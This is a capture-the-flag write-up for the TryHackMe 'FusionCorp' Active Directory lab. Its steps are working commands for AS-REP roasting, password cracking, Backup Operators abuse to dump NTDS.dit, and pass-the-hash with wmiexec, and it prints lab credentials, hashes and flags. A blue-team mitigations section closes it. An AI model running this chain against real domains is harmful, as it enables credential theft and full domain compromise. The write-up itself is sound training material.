---
layout: writeup
name: "FusionCorp"
platform: "TryHackMe"
category: "thm"
difficulty: "Medium"
os: "Windows AD DC"
date: 2025-11-12
pwned: true
---
# TryHackMe — FusionCorp (Hard)

**IP:** 10.201.6.61  
**OS:** Windows (AD DC)  
**Author:** inksec (Tate)  
**Tags:** AD, AS-REP roast, LDAP info leak, Backup Operators (SeBackupPrivilege), Diskshadow, NTDS dump

## TL;DR (attack chain)
Web /backup → employees.ods (user list) → Kerbrute find `lparker` → AS-REP roast → crack to `!!abbylvzsvs2k6!` → LDAP desc leak gives `jmurphy` creds → Evil-WinRM → `jmurphy` is **Backup Operators** → Diskshadow VSS → copy `NTDS.dit`/`SYSTEM`/`SAM` → secretsdump → **Administrator** NTLM → wmiexec → root.

---

## Enumeration

### Nmap
Open AD/DC stack: 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268/3269, 3389, 9389 (WS2019 DC). HTTP banner: **eBusiness Bootstrap Template**.

### Web (IIS)
`/backup/` exposed; downloaded `employees.ods` → usernames list.

```text
jmickel aarnold llinda jpowel dvroslav tjefferson nmaurin mladovic lparker kgarland dpertersen
```

### Username discovery
```bash
kerbrute userenum users.txt --dc 10.201.6.61 -d fusion.corp
# [+] VALID USERNAME: lparker@fusion.corp
```

### AS-REP Roast
```bash
impacket-GetNPUsers fusion.corp/ -dc-ip 10.201.6.61 -usersfile users.txt -outputfile hashes.txt
# got AS-REP for lparker
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# lparker : !!abbylvzsvs2k6!
```

### LDAP loot (desc leak)
```bash
netexec ldap 10.201.6.61 -u 'lparker' -p '!!abbylvzsvs2k6!' --users
# description reveals: jmurphy : u8WC3!kLsgw=#bRY
```

---

## Footholds (Evil-WinRM)
```bash
evil-winrm -i 10.201.6.61 -u lparker -p '!!abbylvzsvs2k6!'
# flag1: THM{c105b6fb249741b89432fada8218f4ef}

evil-winrm -i 10.201.6.61 -u jmurphy -p 'u8WC3!kLsgw=#bRY'
# flag2: THM{b4aee2db2901514e28db4242e047612e}
```

`whoami /all` shows **BUILTIN\Backup Operators** with **SeBackupPrivilege**.

---

## Privilege Escalation (SeBackupPrivilege → NTDS)

### Create VSS and copy sensitive files
`viper.dsh`:
```text
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

```powershell
# On the DC (as jmurphy)
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit
reg save HKLM\SYSTEM .\system
reg save HKLM\SAM .\sam
```

### Extract hashes offline
```bash
impacket-secretsdump -ntds ntds.dit -system system -sam sam local
# Administrator NTLM: 9653b02d945329c7270525c4c2a69c67
```

### Admin shell
`psexec` was flaky → used `wmiexec`:
```bash
impacket-wmiexec fusion.corp/Administrator@10.201.6.61 -hashes :9653b02d945329c7270525c4c2a69c67
# C:\Users\Administrator\Desktop\flag.txt
# THM{f72988e57bfc1deeebf2115e10464d15}
```

---

## Notes & Gotchas
- **/backup** directory indexing is the pivot; don’t miss it.
- If `psexec` fails, try `wmiexec` or `smbexec`.
- Backing up NTDS on Server 2019: VSS via **Diskshadow** + `/b` copy works cleanly.

## Mitigations (blue team)
- Disable directory listing; secure backups.  
- Remove **“Do not require Kerberos preauth”** from users.  
- Never store passwords in **AD description**.  
- Restrict/monitor **Backup Operators**; require JIT and separate backup path.  
- Enable LAPS/strong password policy; audit 4768/4769/4624.

## Tools
nmap · gobuster · kerbrute · Impacket (GetNPUsers, secretsdump, wmiexec) · Evil-WinRM · netexec (CrackMapExec) · Diskshadow · john

**Proofs:** `HTB/proofs/fusioncorp.png`
